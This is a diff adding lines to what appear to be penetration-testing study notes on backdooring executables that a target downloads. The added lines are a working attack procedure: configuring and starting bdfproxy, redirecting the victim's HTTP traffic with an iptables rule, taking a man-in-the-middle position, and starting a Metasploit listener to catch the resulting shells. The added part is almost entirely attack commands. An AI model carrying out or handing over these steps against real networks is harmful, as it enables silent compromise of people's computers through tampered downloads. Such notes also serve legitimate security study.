@@ -271,3 +271,13 @@ Requires DNS spoofing + Evilgrade (a server to serve the update).
 Backdoor any .exe file that the target downloads using the Backdoor Factory Proxy (bdfproxy).
 
 We need to be in the middle of the connection.
+
+* Edit bdfproxy config file and set your IP address and proxy mode to transparent
+  * ` nano /etc/bdfproxy/bdfproxy.cfg`
+* Start bdfproxy
+  * `bdfproxy`
+* Redirect traffic to bdfoxy (the proxy is running un port 8080)
+  * `iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080`
+* Become the MITM
+* Start listening for connections
+  * `msfconsole -r /usr/share/bdfproxy/bdf_proxy_msf_resource.rc`
